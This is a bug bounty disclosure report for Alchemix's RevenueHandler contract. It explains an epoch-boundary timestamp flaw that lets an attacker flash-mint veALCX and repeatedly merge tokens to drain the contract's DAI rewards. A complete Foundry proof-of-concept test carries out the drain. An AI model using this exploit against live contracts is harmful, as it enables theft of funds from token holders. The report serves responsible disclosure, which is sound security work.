# 31453 - \[SC - Critical] The balance of RevenueHandler can be drained

Submitted on May 19th 2024 at 18:09:45 UTC by @DuckAstronomer for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31453

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Vulnerability Details

Normally, veALCX holders can claim the reward that has been accrued during the current Epoch from the `RevenueHandler` contract in the next Epoch.

The `epochUserVeBalance` variable contains the veALCX user's balance for the previous epoch, while the `epochTotalVeSupply` variable contains the total veALCX supply for the previous epoch.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L322>

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L319>

However, the `balanceOfTokenAt()` function has a strong less condition:

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L1430>

```
// If time is before before the first epoch or a tokens first timestamp, return 0
if (_epoch == 0 || _time < pointHistory[userFirstEpoch[_tokenId]].ts) {
    return 0;
}
```

Therefore, if the veALCX has been created in a block where `block.timestamp == New EPOCH beginning`, the `RevenueHandler._claimable()` function will return a positive value (> 0).

This means that an attacker can flash-mint veALCX at that specific block and claim the reward from the `RevenueHandler` for the previous Epoch, effectively stealing the rewards for the previous Epoch.

## Impact Details

Theft on reward from the `RevenueHandler` contract.

## Proof of Concept

Poc scenario:

1. In the current epoch, two whales (whale\_1 and whale\_2) mint veALCX.
2. The Revenue Handler accrues the revenue in DAI (10k DAI), and the `checkpoint()` method is called.
3. However, the whales can claim the reward in the next epoch.
4. The bad guy (attacker) crafts an attack transaction in the block where `block.timestamp == New EPOCH beginning`.
5. In this scenario, the attacker can mint veALCX and claim a portion of the DAI reward from the previous epoch due to the condition `block.timestamp == New EPOCH beginning`, effectively stealing the reward from the whales.
6. The attacker can then proceed to drain the entire DAI balance from the Revenue Handler.
7. This is achieved by creating a new veALCX with a small amount of BAL and then calling `veALCX.merge()`. This action transfers the balance from the previous veALCX to the new one, providing another opportunity to claim DAI from the Revenue Handler.
8. Repeat step 7 until the Revenue Handler's balance reaches 0.

To run the PoC, place the code below in the `PoC.t.sol` file and execute the command: `forge test --mp src/test/PoC.t.sol --fork-url 'URL'`.

```
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract Poc is BaseTest {
    uint256 EPOCH = 2 weeks;

    function setUp() public {
        setupContracts(block.timestamp);

        hevm.prank(admin);
        revenueHandler.transferOwnership(address(this));

        revenueHandler.addRevenueToken(dai);
    }

    // Run as: forge test --mp src/test/Poc.t.sol --fork-url 'URL'
    function test_poc() public {
        address whale1 = address(1);
        address whale2 = address(2);

        address bad = address(3);

        // Whales stake and get veAlcx
        uint256 tokenId_w1 = createVeAlcx(whale1, 1000e18, MAXTIME, false);
        uint256 tokenId_w2 = createVeAlcx(whale2, 1000e18, MAXTIME, false);

        // Accrue revenue in DAI
        deal(dai, address(this), 10_000 ether);
        IERC20(dai).transfer(address(revenueHandler), 10_000 ether);

        // Checkpoint in current epoch
        revenueHandler.checkpoint();

        // Whales should be able to claim the reward in the next Epoch
        assertEq(
            revenueHandler.claimable(tokenId_w1, dai), 0
        );

        // Move to the beginning of the next Epoch
        uint256 BEGINNING_NEW_EPOCH = ((block.timestamp) / EPOCH) * EPOCH + EPOCH;
        hevm.warp(BEGINNING_NEW_EPOCH);

        // The bad guy immediately mints veAlcx and calls checkpoint() in the new Epoch
        uint256 tokenId_bad = createVeAlcx(bad, 100e18, MAXTIME, false);
        revenueHandler.checkpoint();

        // Because the block.timestamp matches the beginning of the Epoch
        // it returns positive value
        // https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L1430
        assertGt(
            veALCX.balanceOfTokenAt(tokenId_bad, BEGINNING_NEW_EPOCH), 0
        );

        assertGt(
            revenueHandler.claimable(tokenId_bad, dai), 0
        );

        // The bad guy claims the reward in DAI
        // stealing the reward from whales
        hevm.startPrank(bad);
        revenueHandler.claim(
            tokenId_bad,
            dai,
            address(0),
            revenueHandler.claimable(tokenId_bad, dai),
            bad
        );
        hevm.stopPrank();

        assertGt(
            IERC20(dai).balanceOf(bad), 0
        );

        // The bad guys completely drains DAI reward from revenueHandler!!!
        assertGt(
            IERC20(dai).balanceOf(address(revenueHandler)), 0
        );

        uint256 last_id = tokenId_bad;
        while(true) {
            uint256 current_id = createVeAlcx(bad, 10, MAXTIME, false);

            hevm.startPrank(bad);

            veALCX.merge(last_id, current_id); // Merge old veALCX with new!!

            uint256 claimable = revenueHandler.claimable(current_id, dai);

            assertGt(
                claimable, 0
            );

            uint256 skip = 0;
            if (claimable > IERC20(dai).balanceOf(address(revenueHandler))) {
                claimable = IERC20(dai).balanceOf(address(revenueHandler));
                skip = 1;
            }

            revenueHandler.claim(
                current_id,
                dai,
                address(0),
                claimable,
                bad
            );

            last_id = current_id;

            if (skip > 0)
                break;

            hevm.stopPrank();
        }

        assertEq(
            IERC20(dai).balanceOf(address(revenueHandler)), 0
        );
    }
}
```
